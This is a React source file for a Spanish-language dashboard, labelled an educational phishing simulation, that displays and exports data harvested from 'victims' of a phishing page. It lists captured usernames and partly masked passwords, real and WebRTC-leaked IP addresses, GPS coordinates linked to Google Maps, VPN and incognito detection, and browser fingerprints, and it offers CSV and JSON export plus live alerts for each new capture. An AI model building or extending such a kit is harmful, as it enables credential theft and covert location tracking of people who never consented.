import { useState, useEffect, useRef } from 'react';

/**
 * Dashboard Component - APEX Style
 *
 * Dark themed analytics dashboard for phishing simulation data
 * Features: Stats cards, charts, detailed victim table with expandable rows
 */
const Dashboard = () => {
  const [victimsData, setVictimsData] = useState([]);
  const [lastDataHash, setLastDataHash] = useState('');
  const [previousVictimCount, setPreviousVictimCount] = useState(0);
  const [newVictimIds, setNewVictimIds] = useState(new Set());
  const [expandedRows, setExpandedRows] = useState(new Set());

  // Stats state
  const [stats, setStats] = useState({
    totalVictims: 0,
    uniqueCountries: 0,
    gpsLocations: 0,
    vpnCount: 0,
    botCount: 0,
    incognitoCount: 0,
    lastCapture: '-'
  });

  // Toast notification
  const showToast = (message) => {
    const toast = document.createElement('div');
    toast.className = 'toast-notification';
    toast.textContent = message;
    document.body.appendChild(toast);

    setTimeout(() => {
      toast.style.animation = 'slideOut 0.3s ease-out';
      setTimeout(() => document.body.removeChild(toast), 300);
    }, 3000);
  };

  // Load data
  const loadData = async () => {
    try {
      const response = await fetch('/api/victims');
      const newData = await response.json();

      const newHash = JSON.stringify(newData);

      if (newHash !== lastDataHash) {
        const currentCount = newData.victims?.length || 0;

        if (previousVictimCount > 0 && currentCount > previousVictimCount) {
          const latest = newData.victims[newData.victims.length - 1];
          const location = `${latest.network?.city || 'Unknown'}, ${latest.network?.country || 'Unknown'}`;
          showToast(`Nuevo víctima capturado! (${location})`);

          const newIds = new Set();
          for (let i = previousVictimCount; i < currentCount; i++) {
            newIds.add(`victim-${currentCount - i}`);
          }
          setNewVictimIds(newIds);
        }

        setPreviousVictimCount(currentCount);
        setVictimsData(newData.victims || []);
        setLastDataHash(newHash);
        updateStats(newData.victims || []);
      } else {
        updateStats(victimsData);
      }
    } catch (error) {
      console.error('Error loading data:', error);
    }
  };

  // Update stats
  const updateStats = (data) => {
    const uniqueCountries = [...new Set(data.map(v => v.network?.country || 'Unknown'))].length;
    const gpsCount = data.filter(v => v.geolocation?.latitude).length;
    const vpnCount = data.filter(v => v.network?.vpnDetection?.likelyVPN).length;
    const botCount = data.filter(v => v.device?.isBot).length;
    const incognitoCount = data.filter(v => v.incognitoMode?.isIncognito).length;

    let lastCapture = '-';
    if (data.length > 0) {
      const last = data[data.length - 1];
      lastCapture = getTimeAgo(new Date(last.timestamp));
    }

    setStats({
      totalVictims: data.length,
      uniqueCountries,
      gpsLocations: gpsCount,
      vpnCount,
      botCount,
      incognitoCount,
      lastCapture
    });
  };

  // Time ago helper
  const getTimeAgo = (date) => {
    const seconds = Math.floor((new Date() - date) / 1000);
    if (seconds < 60) return `Hace ${seconds} seg`;
    if (seconds < 3600) return `Hace ${Math.floor(seconds / 60)} min`;
    if (seconds < 86400) return `Hace ${Math.floor(seconds / 3600)} hrs`;
    return `Hace ${Math.floor(seconds / 86400)} días`;
  };

  // Toggle row details
  const toggleDetails = (victimId) => {
    const newExpanded = new Set(expandedRows);
    if (newExpanded.has(victimId)) {
      newExpanded.delete(victimId);
    } else {
      newExpanded.add(victimId);
    }
    setExpandedRows(newExpanded);
  };

  // Clear data
  const clearData = async () => {
    if (confirm('¿Seguro que quieres eliminar TODOS los datos?')) {
      try {
        const password = prompt('Ingresa la contraseña del dashboard:');
        await fetch('/api/clear', {
          method: 'DELETE',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ password })
        });
        alert('Datos eliminados');
        loadData();
      } catch (error) {
        alert('Error al eliminar datos');
      }
    }
  };

  // Export JSON
  const exportData = () => {
    try {
      const dataStr = JSON.stringify(victimsData, null, 2);
      const dataBlob = new Blob([dataStr], { type: 'application/json' });
      const url = URL.createObjectURL(dataBlob);
      const link = document.createElement('a');
      link.href = url;
      link.download = `victims_${new Date().toISOString()}.json`;
      link.click();
      URL.revokeObjectURL(url);
    } catch (error) {
      alert('Error al exportar');
    }
  };

  // Export CSV
  const exportCSV = () => {
    try {
      let csv = 'Timestamp,Username,IP,Country,City,Latitude,Longitude,Device,OS,Browser\n';
      victimsData.forEach(v => {
        const lat = v.geolocation?.latitude || '';
        const lon = v.geolocation?.longitude || '';
        csv += `"${v.timestamp}","${v.metadata?.formData?.username || 'N/A'}","${v.network?.ip || ''}","${v.network?.country || ''}","${v.network?.city || ''}","${lat}","${lon}","${v.device?.type || ''}","${v.os?.name || ''}","${v.browser?.name || ''}"\n`;
      });

      const blob = new Blob([csv], { type: 'text/csv' });
      const url = URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      link.download = `victims_${new Date().toISOString()}.csv`;
      link.click();
      URL.revokeObjectURL(url);
    } catch (error) {
      alert('Error al exportar CSV');
    }
  };

  // Initial load and auto-refresh
  useEffect(() => {
    loadData();
    const interval = setInterval(loadData, 5000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen bg-[#0a0e27] text-[#e0e0e0] p-5">
      <style>{`
        .apex-gradient {
          background: linear-gradient(135deg, #00ff88, #00d4ff);
          -webkit-background-clip: text;
          background-clip: text;
          -webkit-text-fill-color: transparent;
        }

        .apex-card {
          background: linear-gradient(135deg, #1a1f3a 0%, #2d1b3d 100%);
          border: 1px solid rgba(0, 255, 136, 0.27);
          transition: all 0.3s;
        }

        .apex-card:hover {
          border-color: #00ff88;
          box-shadow: 0 8px 25px rgba(0, 255, 136, 0.3);
        }

        .apex-button {
          background: linear-gradient(135deg, #00ff88, #00d4ff);
          color: #0a0e27;
          font-weight: bold;
          box-shadow: 0 4px 15px rgba(0, 255, 136, 0.3);
          transition: all 0.3s;
        }

        .apex-button:hover {
          transform: translateY(-2px);
          box-shadow: 0 6px 20px rgba(0, 255, 136, 0.5);
        }

        .apex-button.danger {
          background: linear-gradient(135deg, #ff3333, #ff6b6b);
        }

        .apex-button.secondary {
          background: linear-gradient(135deg, #667eea, #764ba2);
        }

        .toast-notification {
          position: fixed;
          top: 20px;
          right: 20px;
          background: linear-gradient(135deg, #00ff88, #00d4ff);
          color: #0a0e27;
          padding: 15px 20px;
          border-radius: 8px;
          box-shadow: 0 4px 15px rgba(0, 255, 136, 0.3);
          font-weight: bold;
          z-index: 10000;
          animation: slideIn 0.3s ease-out;
          min-width: 250px;
        }

        @keyframes slideIn {
          from { transform: translateX(400px); opacity: 0; }
          to { transform: translateX(0); opacity: 1; }
        }

        @keyframes slideOut {
          from { transform: translateX(0); opacity: 1; }
          to { transform: translateX(400px); opacity: 0; }
        }

        @keyframes victimPulse {
          0%, 100% { background: #13182e; }
          50% { background: rgba(0, 255, 136, 0.27); box-shadow: 0 0 20px rgba(0, 255, 136, 0.3); }
        }

        .new-victim-highlight {
          animation: victimPulse 2s ease-out;
        }

        .badge {
          display: inline-block;
          padding: 3px 8px;
          border-radius: 4px;
          font-size: 11px;
          font-weight: bold;
          margin-left: 5px;
        }
      `}</style>

      {/* Header */}
      <div className="text-center mb-8 p-8 rounded-2xl border-2 border-[#00ff88] shadow-[0_0_30px_rgba(0,255,136,0.2)]" style={{background: 'linear-gradient(135deg, #1a1f3a 0%, #2d1b3d 100%)'}}>
        <h1 className="text-5xl font-bold mb-3 apex-gradient">CIBERSEGURIDAD DASHBOARD</h1>
        <p className="text-gray-500">Sistema de Análisis de Seguridad - Proyecto Educativo</p>
      </div>

      {/* Controls */}
      <div className="flex gap-3 flex-wrap justify-center mb-6">
        <button onClick={loadData} className="apex-button px-7 py-3.5 rounded-lg">Actualizar</button>
        <button onClick={clearData} className="apex-button danger px-7 py-3.5 rounded-lg">Limpiar Datos</button>
        <button onClick={exportData} className="apex-button secondary px-7 py-3.5 rounded-lg">Exportar JSON</button>
        <button onClick={exportCSV} className="apex-button secondary px-7 py-3.5 rounded-lg">Exportar CSV</button>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 xl:grid-cols-7 gap-5 mb-8">
        {[
          { label: 'Víctimas Totales', value: stats.totalVictims },
          { label: 'Países Únicos', value: stats.uniqueCountries },
          { label: 'Ubicaciones GPS', value: stats.gpsLocations },
          { label: 'VPNs Detectadas', value: stats.vpnCount },
          { label: 'Bots Detectados', value: stats.botCount },
          { label: 'Modo Incógnito', value: stats.incognitoCount },
          { label: 'Última Captura', value: stats.lastCapture, small: true }
        ].map((stat, i) => (
          <div key={i} className="apex-card p-6 rounded-xl text-center hover:-translate-y-1">
            <h3 className="text-xs text-[#00ff88] mb-4 uppercase">{stat.label}</h3>
            <div className={`${stat.small ? 'text-base' : 'text-4xl'} font-bold apex-gradient`}>
              {stat.value}
            </div>
          </div>
        ))}
      </div>

      {/* Victims Table */}
      <div className="bg-[#1a1f3a] p-6 rounded-xl border border-[#00ff88] overflow-x-auto">
        <h2 className="text-3xl mb-5 text-[#00ff88]">Registro de Víctimas</h2>

        {victimsData.length === 0 ? (
          <div className="text-center py-16 text-gray-500 text-xl">
            <div className="inline-block w-12 h-12 border-4 border-[rgba(0,255,136,0.3)] border-t-[#00ff88] rounded-full animate-spin mb-5"></div>
            <p>Cargando datos...</p>
          </div>
        ) : (
          <table className="w-full text-sm border-collapse">
            <thead>
              <tr className="bg-[#0a0e27]">
                {['#', 'Usuario', 'IP', 'Ubicación', 'Coordenadas', 'Dispositivo', 'Navegador', 'Fecha'].map(h => (
                  <th key={h} className="text-left p-3.5 text-[#00ff88] font-bold uppercase text-xs border-b border-gray-700">{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {[...victimsData].reverse().map((victim, index) => {
                const victimId = `victim-${victimsData.length - index}`;
                const isExpanded = expandedRows.has(victimId);
                const isNew = newVictimIds.has(victimId);

                // Location badge
                const locationSource = victim.network?.locationSource;
                let locationBadge = '';
                if (locationSource === 'gps') locationBadge = '🟢';
                else if (locationSource === 'ipapi') locationBadge = '🔴';
                else if (victim.network?.fromCache) locationBadge = '🟠';
                else locationBadge = '🔴';

                // Coordinates
                const hasGPS = victim.geolocation?.latitude && victim.geolocation?.longitude;
                const coords = hasGPS ?
                  `${victim.geolocation.latitude.toFixed(4)}, ${victim.geolocation.longitude.toFixed(4)}` :
                  'N/A';

                // IP with WebRTC
                let ipDisplay = victim.network?.ip || 'Unknown';
                if (victim.webRTC?.publicIP && victim.webRTC.publicIP !== victim.network?.ip) {
                  ipDisplay += ` / ${victim.webRTC.publicIP}`;
                }

                return (
                  <>
                    <tr
                      key={victimId}
                      onClick={() => toggleDetails(victimId)}
                      className={`cursor-pointer border-b border-gray-700 hover:bg-[#2a2f4a] ${isNew ? 'new-victim-highlight' : ''}`}
                    >
                      <td className="p-3.5">{victimsData.length - index}</td>
                      <td className="p-3.5">
                        <strong>{victim.metadata?.formData?.username || 'Visitor'}</strong>
                      </td>
                      <td className="p-3.5">{ipDisplay}</td>
                      <td className="p-3.5">
                        {locationBadge} {victim.network?.city || 'Unknown'}, {victim.network?.country || 'Unknown'}
                        {victim.network?.vpnDetection?.likelyVPN && <span className="badge bg-red-500/30 text-red-400">VPN</span>}
                      </td>
                      <td className="p-3.5">
                        {hasGPS ? (
                          <a href={`https://www.google.com/maps?q=${coords}`} target="_blank" className="text-[#00d4ff] hover:underline">{coords}</a>
                        ) : coords}
                      </td>
                      <td className="p-3.5">
                        {victim.device?.type || 'Unknown'} - {victim.os?.name || 'Unknown'}
                        {victim.device?.isBot && <span className="badge bg-purple-500/30 text-purple-400">BOT</span>}
                      </td>
                      <td className="p-3.5">
                        {victim.browser?.name || 'Unknown'} {victim.browser?.version || ''}
                        {victim.incognitoMode?.isIncognito && <span className="badge bg-purple-500/30 text-purple-400">INCOGNITO</span>}
                      </td>
                      <td className="p-3.5">{new Date(victim.timestamp).toLocaleString('es-MX')}</td>
                    </tr>

                    {/* Expanded Details Row */}
                    {isExpanded && (
                      <tr className="bg-[#0a0e27]">
                        <td colSpan="8" className="p-5 border-l-4 border-[#00ff88]">
                          <VictimDetails victim={victim} />
                        </td>
                      </tr>
                    )}
                  </>
                );
              })}
            </tbody>
          </table>
        )}
      </div>
    </div>
  );
};

// Victim Details Component
const VictimDetails = ({ victim }) => {
  const DetailSection = ({ title, children }) => (
    <div className="mb-4">
      <h4 className="text-[#00ff88] mb-2 text-sm font-bold">{title}</h4>
      {children}
    </div>
  );

  const DetailGrid = ({ items }) => (
    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-2.5 text-xs">
      {items.map((item, i) => (
        <div key={i} className="bg-[#1a1f3a] p-2 rounded">
          <div className="text-gray-500 text-[10px] uppercase">{item.label}</div>
          <div className="text-[#e0e0e0] mt-1">{item.value}</div>
        </div>
      ))}
    </div>
  );

  return (
    <div className="space-y-4">
      {/* Credentials */}
      {victim.metadata?.formData?.password && (
        <DetailSection title="Credenciales Capturadas">
          <DetailGrid items={[
            { label: 'Usuario', value: victim.metadata.formData.username || 'N/A' },
            { label: 'Contraseña', value: '••••••••' + (victim.metadata.formData.password?.slice(-4) || '') }
          ]} />
        </DetailSection>
      )}

      {/* VPN Detection */}
      {victim.network?.vpnDetection && (
        <DetailSection title="Detección de VPN/Proxy">
          <DetailGrid items={[
            { label: 'Probable VPN', value: victim.network.vpnDetection.likelyVPN ? 'SÍ' : 'NO' },
            { label: 'Confianza', value: (victim.network.vpnDetection.confidence || 'low').toUpperCase() },
            { label: 'Timezone Mismatch', value: victim.network.vpnDetection.timezoneMismatch ? 'Sí' : 'No' },
            { label: 'WebRTC Leak', value: victim.network.vpnDetection.webRTCLeak ? 'Sí' : 'No' }
          ]} />
        </DetailSection>
      )}

      {/* Device & Hardware */}
      <DetailSection title="Dispositivo & Hardware">
        <DetailGrid items={[
          { label: 'Tipo', value: victim.device?.type || 'Unknown' },
          { label: 'CPU Cores', value: victim.device?.cpuCores || 'N/A' },
          { label: 'Memoria', value: victim.device?.memory || 'N/A' },
          { label: 'Bot', value: victim.device?.isBot ? 'Sí' : 'No' }
        ]} />
      </DetailSection>

      {/* Fingerprints */}
      {victim.fingerprints && (
        <DetailSection title="Fingerprints">
          <DetailGrid items={[
            { label: 'Canvas', value: (victim.fingerprints.canvas || 'N/A').substring(0, 20) + '...' },
            { label: 'WebGL', value: victim.fingerprints.webgl?.renderer || 'N/A' }
          ]} />
        </DetailSection>
      )}
    </div>
  );
};

export default Dashboard;
